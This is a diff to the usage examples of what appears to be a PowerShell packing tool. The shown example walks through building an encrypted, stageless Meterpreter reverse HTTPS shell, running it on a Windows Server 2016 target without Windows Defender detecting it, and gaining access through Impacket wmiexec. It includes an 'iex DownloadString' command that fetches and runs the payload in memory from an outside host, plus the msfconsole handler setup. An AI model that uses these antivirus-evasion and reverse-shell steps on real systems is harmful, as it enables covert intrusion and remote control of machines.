@@ -442,8 +442,8 @@ luid 149493
 
 
 ===================================================================================================================================================
-Example 4 - Create & run a packed/encrypted version of a (x64) Meterpreter reverse https shell (.ps1) on a Windows Server 2016 without getting 
-            detected by Windows Defender
+Example 4 - Create & run a packed/encrypted version of a stageless (x64) Meterpreter reverse shell (.ps1) on a Windows Server 2016 without 
+            getting detected by Windows Defender
 ===================================================================================================================================================
 
 Step 1 - Generate a stageless Meterpreter reverse HTTPS shell in PowerShell format with the option 'psh-reflection' (+ use an autosign SSL cert)
@@ -490,9 +490,9 @@ PS C:\temp> Invoke-PoSH-Packer -FileUrl http://192.168.1.30:8080/Invoke-meterpre
 [+] Done!
 
 
-Step 3 - Upload & execute into memory the packed/encrypted version of the script 'packed-posh-msf-reverseshell.ps1' on a target Windows server 2016
-         without being detected by the Windows Defender AV 
------------------------------------------------------------------------------------------------------------------------------------------------------
+Step 3 - Upload & execute into memory the packed/encrypted script 'packed-posh-msf-reverseshell.ps1' on a target Windows server 2016
+         without being detected by the Windows Defender AV (enabled and up-to-date)
+--------------------------------------------------------------------------------------------------------------------------------------
 
 C:\Users\Administrator\Documents\Tools-Pentest\4-Impacket_windows>wmiexec.exe administrator@192.168.1.76
 Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies
@@ -508,7 +508,7 @@ C:\>cd temp
 C:\temp>powershell -c iex (New-Object Net.WebClient).DownloadString('http://192.168.1.113:8081/temp/packed-posh-msf-reverseshell.ps1');
 
 
-Step 4 - Enjoy your meterprerter shell 
+Step 4 - Enjoy your meterpreter shell 
 ---------------------------------------
 
 jeff@kali:~$ sudo msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter_reverse_https; set LHOST 192.168.1.30; set LPORT 443; set EXITFUNC thread; set ExitOnSession false; set SessionCommunicationTimeout 0; set EnableUnicodeEncoding true; set HandlerSSLCert /home/jeff/Documents/Tools/Pivoting-with-MSF/pentest.pem;  run -j"
